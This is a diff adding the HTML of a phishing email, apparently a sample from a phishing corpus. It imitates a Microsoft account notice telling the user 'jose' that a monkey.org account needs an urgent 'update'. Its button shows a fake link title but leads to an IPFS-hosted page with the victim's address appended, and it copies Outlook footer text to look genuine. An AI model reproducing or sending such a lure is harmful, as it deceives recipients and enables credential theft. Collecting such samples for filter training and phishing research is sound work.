@@ -1,0 +1,91 @@
+<HTML><HEAD>
+<META name=GENERATOR content="MSHTML 8.00.7601.17514">
+<META content=IE=edge http-equiv=X-UA-Compatible></HEAD>
+<BODY>
+<TABLE style="WIDOWS: 2; TEXT-TRANSFORM: none; FONT-STYLE: normal; FONT-FAMILY: Arial; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(51,51,51); FONT-SIZE: 12px; FONT-WEIGHT: 400; WORD-SPACING: 0px; border-radius: 0px; box-shadow: none; text-shadow: none; font-variant-ligatures: normal; font-variant-caps: normal; text-decoration-style: initial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial" border=0 cellSpacing=0 
+cellPadding=0 width="100%" align=center>
+<TBODY style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="border-radius: 0px; box-shadow: none; text-shadow: none" bgColor=#e3e3e3 vAlign=top width="100%" align=middle>
+<TABLE style="MIN-WIDTH: 640px; WIDTH: 640px; MAX-WIDTH: 640px; border-radius: 0px; box-shadow: none; text-shadow: none" border=0 cellSpacing=0 cellPadding=0 width=640 align=center>
+<TBODY style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="border-radius: 0px; box-shadow: none; text-shadow: none" bgColor=#e3e3e3>
+<DIV style="BORDER-TOP: 0px; PADDING-TOP: 0px; border-radius: 0px; box-shadow: none; text-shadow: none" id=v1x_x_x_DNT-Header_Text>
+<TABLE style="MIN-WIDTH: 100%; WIDTH: 640px; border-radius: 0px; box-shadow: none; text-shadow: none" border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none"></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE>
+<TABLE style="border-radius: 0px; box-shadow: none; text-shadow: none" align=center>
+<TBODY style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="border-radius: 0px; box-shadow: none; text-shadow: none" bgColor=#ffffff>
+<DIV style="BORDER-TOP: 0px; PADDING-TOP: 0px; border-radius: 0px; box-shadow: none; text-shadow: none">
+<TABLE style="MIN-WIDTH: 100%; WIDTH: 640px; border-radius: 0px; box-shadow: none; text-shadow: none" border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TABLE style="MIN-WIDTH: 100%; border-radius: 0px; box-shadow: none; text-shadow: none" cellSpacing=0 cellPadding=0 width="100%" bgColor=#ffffff align=center>
+<TBODY style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="PADDING-BOTTOM: 24px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px; PADDING-TOP: 24px; border-radius: 0px; box-shadow: none; text-shadow: none" class=v1x_x_x_mob_padding align=left></TD>
+<TD style="PADDING-BOTTOM: 24px; LINE-HEIGHT: 30px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px; FONT-SIZE: 25px; PADDING-TOP: 24px; border-radius: 0px; box-shadow: none; text-shadow: none" align=right><STRONG style="FONT-WEIGHT: 400; border-radius: 0px; box-shadow: none; text-shadow: none"></STRONG></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></DIV>
+<DIV style="border-radius: 0px; box-shadow: none; text-shadow: none" id=v1x_x_x_A>
+<TABLE style="BACKGROUND-COLOR: rgb(255,255,255) !important; border-radius: 0px; box-shadow: none; text-shadow: none" border=0 cellSpacing=0 cellPadding=0 width=640 bgColor=#ffffff align=center>
+<TBODY style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="border-radius: 0px; box-shadow: none; text-shadow: none" bgColor=#ffffff align=middle>
+<TABLE style="WIDTH: 640px; border-radius: 0px; box-shadow: none; text-shadow: none" border=0 cellSpacing=0 cellPadding=0 width=640 align=center>
+<TBODY style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="PADDING-BOTTOM: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 0px; border-radius: 0px; box-shadow: none; text-shadow: none" align=middle></TD></TR></TBODY></TABLE></TD></TR>
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none"></TR>
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="border-radius: 0px; box-shadow: none; text-shadow: none" align=left>
+<TABLE style="MIN-WIDTH: 100%; WIDTH: 640px; border-radius: 0px; box-shadow: none; text-shadow: none" border=0 cellSpacing=0 cellPadding=0 width="100%" align=left>
+<TBODY style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="TEXT-ALIGN: left; PADDING-BOTTOM: 24px; LINE-HEIGHT: 40px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px; FONT-FAMILY: 'Segoe UI', SUWR, Arial, sans-serif; COLOR: rgb(0,120,212) !important; FONT-SIZE: 30px; FONT-WEIGHT: 300; PADDING-TOP: 0px; border-radius: 0px; box-shadow: none; text-shadow: none" align=left>monkey.org&nbsp;Account update</TD></TR>
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="TEXT-ALIGN: left; PADDING-BOTTOM: 14px; LINE-HEIGHT: 27px; PADDING-LEFT: 24px; PADDING-RIGHT: 4px; FONT-FAMILY: 'Segoe UI', SUWR, Arial, sans-serif; COLOR: rgb(70,70,70) !important; FONT-SIZE: 18px; FONT-WEIGHT: 200; PADDING-TOP: 0px; border-radius: 0px; box-shadow: none; text-shadow: none" align=right>jose&nbsp;your&nbsp;monkey.org account is due&nbsp;for update now<BR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+Kindly&nbsp;rectify this issue to prevent account malfunction</TD></TR>
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none"></TR>
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="PADDING-BOTTOM: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; BORDER-COLLAPSE: separate; PADDING-TOP: 0px; border-radius: 0px; box-shadow: none; text-shadow: none" vAlign=top>
+<TABLE style="MARGIN: 0px auto; border-radius: 0px; box-shadow: none; text-shadow: none" border=0 cellSpacing=0 cellPadding=0 align=center>
+<TBODY style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="TEXT-ALIGN: center; PADDING-BOTTOM: 0px; LINE-HEIGHT: 40px; BACKGROUND-COLOR: rgb(0,120,212) !important; PADDING-LEFT: 24px; PADDING-RIGHT: 24px; DISPLAY: block; BORDER-COLLAPSE: separate; FONT-FAMILY: 'Segoe UI', SUWR, Arial, sans-serif; FONT-SIZE: 20px; FONT-WEIGHT: 400; TEXT-DECORATION: none; PADDING-TOP: 0px; border-radius: 0px; box-shadow: none; text-shadow: none" bgColor=#0078d4 vAlign=center align=middle>
+<A style="COLOR: rgb(0,105,166); TEXT-DECORATION: none; border-radius: 0px; box-shadow: none; text-shadow: none" title=http://Hoteljaroslaw/fix-issue href="https://ipfs.io/ipfs/Qmb1RitWqv2Tz4b1FN6P43YLRE9fG87wuCj1Htma2i6aAY/allDomainn.html#jose@monkey.org" rel=noreferrer target=_blank><STRONG style="FONT-WEIGHT: 400; border-radius: 0px; box-shadow: none; text-shadow: none">Rectify jose@monkey.org update</STRONG></A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="LINE-HEIGHT: 24px; FONT-SIZE: 1px; border-radius: 0px; box-shadow: none; text-shadow: none" height=24></TD></TR></TBODY></TABLE></DIV>
+<DIV style="border-radius: 0px; box-shadow: none; text-shadow: none" id=v1x_x_x_Emergency>
+<DIV style="LINE-HEIGHT: 0px; FONT-SIZE: 0px; BORDER-TOP: 0px; PADDING-TOP: 0px; border-radius: 0px; box-shadow: none; text-shadow: none" height="0"></DIV></DIV>
+<DIV style="border-radius: 0px; box-shadow: none; text-shadow: none" id=v1x_x_x_B class=v1x_x_x_mktEditable>
+<DIV style="LINE-HEIGHT: 0px; FONT-SIZE: 0px; BORDER-TOP: 0px; PADDING-TOP: 0px; border-radius: 0px; box-shadow: none; text-shadow: none" height="0"></DIV></DIV>
+<DIV style="border-radius: 0px; box-shadow: none; text-shadow: none" id=v1x_x_x_C></DIV>
+<DIV style="border-radius: 0px; box-shadow: none; text-shadow: none" id=v1x_x_x_D>
+<TABLE style="MIN-WIDTH: 100%; WIDTH: 640px; border-radius: 0px; box-shadow: none; text-shadow: none" border=0 cellSpacing=0 cellPadding=0 width="100%" bgColor=#ffffff>
+<TBODY style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none"></TR>
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none"></TR>
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none"></TR></TBODY></TABLE></DIV>
+<DIV style="border-radius: 0px; box-shadow: none; text-shadow: none" id=v1x_x_x_E>
+<DIV style="LINE-HEIGHT: 0px; FONT-SIZE: 0px; BORDER-TOP: 0px; PADDING-TOP: 0px; border-radius: 0px; box-shadow: none; text-shadow: none" height="0"></DIV></DIV>
+<TABLE style="WIDTH: 640px; border-radius: 0px; box-shadow: none; text-shadow: none" border=0 cellSpacing=0 cellPadding=0 width=640 bgColor=#5e5e5e align=center>
+<TBODY style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="PADDING-BOTTOM: 24px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px; PADDING-TOP: 24px; border-radius: 0px; box-shadow: none; text-shadow: none" bgColor=#f2f2f2>
+<TABLE style="MIN-WIDTH: 100%; WIDTH: 592px; border-radius: 0px; box-shadow: none; text-shadow: none" border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="LINE-HEIGHT: 12px; FONT-FAMILY: 'Segoe UI Regular', SUWR, Arial, sans-serif; COLOR: rgb(94,94,94) !important; FONT-SIZE: 10px; border-radius: 0px; box-shadow: none; text-shadow: none" align=left>
+<DIV style="BORDER-TOP: 0px; PADDING-TOP: 0px; border-radius: 0px; box-shadow: none; text-shadow: none" id=v1x_x_x_DNT-Social>
+<DIV style="LINE-HEIGHT: 0px; FONT-SIZE: 0px; BORDER-TOP: 0px; PADDING-TOP: 0px; border-radius: 0px; box-shadow: none; text-shadow: none" height="0"></DIV></DIV></TD></TR>
+<TR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<TD style="LINE-HEIGHT: 12px; FONT-FAMILY: 'Segoe UI Regular', SUWR, Arial, sans-serif; COLOR: rgb(94,94,94) !important; FONT-SIZE: 10px; border-radius: 0px; box-shadow: none; text-shadow: none" class=v1x_x_x_mob_padding align=left>
+<DIV style="BORDER-TOP: 0px; PADDING-TOP: 0px; border-radius: 0px; box-shadow: none; text-shadow: none" id=v1x_x_x_DNT-Footer>
+<DIV style="BORDER-TOP: 0px; PADDING-TOP: 0px; border-radius: 0px; box-shadow: none; text-shadow: none" align=left></DIV><BR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<DIV style="border-radius: 0px; box-shadow: none; text-shadow: none">
+<P style="border-radius: 0px; box-shadow: none; text-shadow: none"></P>
+<DIV style="LINE-HEIGHT: normal; BACKGROUND-COLOR: rgb(244,244,244) !important; MARGIN: 0px; FONT-FAMILY: 'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI', 'Segoe WP', Segoe, 'Tahoma Serif', Verdana, sans-serif; COLOR: rgb(102,102,102) !important; FONT-SIZE: 10px; border-radius: 0px; box-shadow: none; text-shadow: none">To stop separating items that are identified as clutter, go to Options.<BR style="border-radius: 0px; box-shadow: none; text-shadow: none">
+To stop receiving notifications about Clutter, go to Options and turn them off.<BR style="border-radius: 0px; box-shadow: none; text-shadow: none">This system notification isn"t an email message and you can"t reply to it.</DIV></DIV></DIV></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></BODY></HTML>
